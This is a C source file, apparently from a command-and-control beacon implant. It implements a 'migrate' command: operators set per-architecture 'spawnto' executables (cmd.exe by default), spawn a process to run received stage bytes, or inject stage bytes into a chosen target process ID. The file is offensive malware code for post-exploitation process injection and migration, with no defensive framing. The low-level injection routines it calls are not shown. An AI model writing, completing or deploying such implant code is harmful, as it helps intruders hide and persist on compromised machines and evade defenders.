#include "beacon_migrate.h"

static CHAR g_migrate_spawnto_x86[MAX_PATH];
static CHAR g_migrate_spawnto_x64[MAX_PATH];

static BOOL MigrateNormalizeArch(const CHAR* raw, CHAR* out, SIZE_T out_size)
{
    if (!raw || !out || out_size == 0) {
        return FALSE;
    }

    if (_stricmp(raw, "x86") == 0) {
        return strncpy_s(out, out_size, "x86", _TRUNCATE) == 0;
    }
    if (_stricmp(raw, "x64") == 0 || _stricmp(raw, "amd64") == 0) {
        return strncpy_s(out, out_size, "x64", _TRUNCATE) == 0;
    }
    return FALSE;
}

static BOOL MigrateCopyStringArg(Parser* parser,
                                 CHAR* out,
                                 SIZE_T out_size,
                                 const CHAR* field_name)
{
    CHAR* value;
    BOOL ok = FALSE;

    if (!parser || !out || out_size == 0) {
        return FALSE;
    }

    value = ParserString(parser);
    if (parser->error[0]) {
        return FALSE;
    }

    if (!value) {
        snprintf(parser->error, sizeof(parser->error),
                 "%s allocation failed", field_name ? field_name : "string");
        return FALSE;
    }

    if (strncpy_s(out, out_size, value, _TRUNCATE) == 0) {
        ok = TRUE;
    } else {
        snprintf(parser->error, sizeof(parser->error),
                 "%s too long", field_name ? field_name : "string");
    }

    HeapFree(GetProcessHeap(), 0, value);
    return ok;
}

static VOID MigrateDefaultSpawnPathForArch(const CHAR* arch,
                                           CHAR* out,
                                           SIZE_T out_size)
{
    SYSTEM_INFO native_info;

    if (!arch || !out || out_size == 0) {
        return;
    }

    ZeroMemory(&native_info, sizeof(native_info));
    GetNativeSystemInfo(&native_info);

    if (_stricmp(arch, "x64") == 0) {
        strncpy_s(out, out_size, "C:\\Windows\\System32\\cmd.exe", _TRUNCATE);
        return;
    }

    if (native_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {
        strncpy_s(out, out_size, "C:\\Windows\\SysWOW64\\cmd.exe", _TRUNCATE);
        return;
    }

    strncpy_s(out, out_size, "C:\\Windows\\System32\\cmd.exe", _TRUNCATE);
}

static VOID MigrateEnsureSpawnToDefaults(VOID)
{
    if (!g_migrate_spawnto_x86[0]) {
        MigrateDefaultSpawnPathForArch("x86",
                                       g_migrate_spawnto_x86,
                                       sizeof(g_migrate_spawnto_x86));
    }
    if (!g_migrate_spawnto_x64[0]) {
        MigrateDefaultSpawnPathForArch("x64",
                                       g_migrate_spawnto_x64,
                                       sizeof(g_migrate_spawnto_x64));
    }
}

static CHAR* MigrateSpawnToSlot(const CHAR* arch)
{
    if (!arch) return NULL;
    if (_stricmp(arch, "x86") == 0) return g_migrate_spawnto_x86;
    if (_stricmp(arch, "x64") == 0) return g_migrate_spawnto_x64;
    return NULL;
}

static BOOL MigrateIsEmptySpawnPathArg(const CHAR* input)
{
    if (!input || !input[0]) {
        return TRUE;
    }
    return strcmp(input, "\"\"") == 0;
}

static BOOL MigrateResolveSpawnPath(const CHAR* arch,
                                    const CHAR* input,
                                    CHAR* out,
                                    SIZE_T out_size)
{
    CHAR* slot;

    if (!arch || !out || out_size == 0) {
        return FALSE;
    }

    if (!MigrateIsEmptySpawnPathArg(input)) {
        if (input == out) {
            return TRUE;
        }
        return strncpy_s(out, out_size, input, _TRUNCATE) == 0;
    }

    MigrateEnsureSpawnToDefaults();
    slot = MigrateSpawnToSlot(arch);
    if (!slot || !slot[0]) {
        return FALSE;
    }
    return strncpy_s(out, out_size, slot, _TRUNCATE) == 0;
}

static ByteBuf MigrateHandleSetSpawnTo(Parser* parser)
{
    CHAR arch[MIGRATE_ARCH_MAX];
    CHAR spawn_path[MAX_PATH];
    CHAR* slot;

    ZeroMemory(arch, sizeof(arch));
    ZeroMemory(spawn_path, sizeof(spawn_path));

    if (!MigrateCopyStringArg(parser, arch, sizeof(arch), "arch") ||
        !MigrateCopyStringArg(parser, spawn_path, sizeof(spawn_path), "spawn_path")) {
        return BbFromText(parser->error);
    }
    if (!MigrateNormalizeArch(arch, arch, sizeof(arch))) {
        return BbFromText("migrate arch must be x86 or x64");
    }
    if (!spawn_path[0]) {
        return BbFromText("migrate spawnto path is required");
    }

    slot = MigrateSpawnToSlot(arch);
    if (!slot || strncpy_s(slot, MAX_PATH, spawn_path, _TRUNCATE) != 0) {
        return BbFromText("migrate spawnto path too long");
    }

    {
        ByteBuf msg;
        BbInit(&msg);
        BbPrintf(&msg, "migrate spawnto %s set: %s", arch, slot);
        return msg;
    }
}

static ByteBuf MigrateHandleSpawn(Parser* parser)
{
    MigrateRequest req;
    DWORD pid = 0;
    CHAR status[160];
    CHAR err[MIGRATE_ERROR_MAX];
    ByteBuf msg;

    ZeroMemory(&req, sizeof(req));
    req.subcmd = MIGRATE_SUBCMD_SPAWN_STAGE;
    BbInit(&req.stage);
    ZeroMemory(status, sizeof(status));
    ZeroMemory(err, sizeof(err));

    if (!MigrateCopyStringArg(parser, req.arch, sizeof(req.arch), "arch") ||
        !MigrateCopyStringArg(parser, req.spawn_path, sizeof(req.spawn_path), "spawn_path") ||
        !MigrateCopyStringArg(parser, req.spawn_args, sizeof(req.spawn_args), "spawn_args")) {
        BbFree(&req.stage);
        return BbFromText(parser->error);
    }

    req.stage = ParserBytes(parser);
    if (parser->error[0]) {
        BbFree(&req.stage);
        return BbFromText(parser->error);
    }

    if (!MigrateNormalizeArch(req.arch, req.arch, sizeof(req.arch))) {
        BbFree(&req.stage);
        return BbFromText("migrate arch must be x86 or x64");
    }
    if (!MigrateResolveSpawnPath(req.arch, req.spawn_path,
                                 req.spawn_path, sizeof(req.spawn_path))) {
        BbFree(&req.stage);
        return BbFromText("migrate spawn path is not set for requested arch");
    }
    if (req.stage.len == 0 || !req.stage.data) {
        BbFree(&req.stage);
        return BbFromText("migrate stage bytes are required");
    }

    if (!MigrateSpawnStage(&req, &pid, status, sizeof(status), err, sizeof(err))) {
        BbFree(&req.stage);
        return BbFromText(err[0] ? err : "migrate spawn failed");
    }

    BbInit(&msg);
    BbPrintf(&msg, "migrate spawn started: pid:%lu arch:%s path:%s",
             (unsigned long)pid, req.arch, req.spawn_path);
    if (status[0]) {
        BbPrintf(&msg, " (%s)", status);
    }
    BbFree(&req.stage);
    return msg;
}

static ByteBuf MigrateHandleInject(Parser* parser)
{
    MigrateRequest req;
    CHAR status[160];
    CHAR err[MIGRATE_ERROR_MAX];
    ByteBuf msg;

    ZeroMemory(&req, sizeof(req));
    req.subcmd = MIGRATE_SUBCMD_INJECT_STAGE;
    BbInit(&req.stage);
    ZeroMemory(status, sizeof(status));
    ZeroMemory(err, sizeof(err));

    if (!MigrateCopyStringArg(parser, req.arch, sizeof(req.arch), "arch")) {
        BbFree(&req.stage);
        return BbFromText(parser->error);
    }

    req.target_pid = ParserU32(parser);
    if (parser->error[0]) {
        BbFree(&req.stage);
        return BbFromText(parser->error);
    }

    req.stage = ParserBytes(parser);
    if (parser->error[0]) {
        BbFree(&req.stage);
        return BbFromText(parser->error);
    }

    if (!MigrateNormalizeArch(req.arch, req.arch, sizeof(req.arch))) {
        BbFree(&req.stage);
        return BbFromText("migrate arch must be x86 or x64");
    }
    if (!req.target_pid) {
        BbFree(&req.stage);
        return BbFromText("migrate target pid is required");
    }
    if (req.stage.len == 0 || !req.stage.data) {
        BbFree(&req.stage);
        return BbFromText("migrate stage bytes are required");
    }

    if (!MigrateInjectStage(&req, status, sizeof(status), err, sizeof(err))) {
        BbFree(&req.stage);
        return BbFromText(err[0] ? err : "migrate inject failed");
    }

    BbInit(&msg);
    BbPrintf(&msg, "migrate inject started: pid:%lu arch:%s",
             (unsigned long)req.target_pid, req.arch);
    if (status[0]) {
        BbPrintf(&msg, " (%s)", status);
    }
    BbFree(&req.stage);
    return msg;
}

ByteBuf MigrateHandle(BeaconContext* ctx, UINT32 task_id, Parser* parser)
{
    UINT32 subcmd;

    (VOID)ctx;
    (VOID)task_id;

    if (!parser) {
        return BbFromText("invalid migrate parser");
    }

    subcmd = ParserU32(parser);
    if (parser->error[0]) {
        return BbFromText(parser->error);
    }

    switch (subcmd) {
    case MIGRATE_SUBCMD_SET_SPAWNTO:
        return MigrateHandleSetSpawnTo(parser);
    case MIGRATE_SUBCMD_SPAWN_STAGE:
        return MigrateHandleSpawn(parser);
    case MIGRATE_SUBCMD_INJECT_STAGE:
        return MigrateHandleInject(parser);
    default:
        break;
    }

    return BbFromText("unknown migrate subcommand");
}
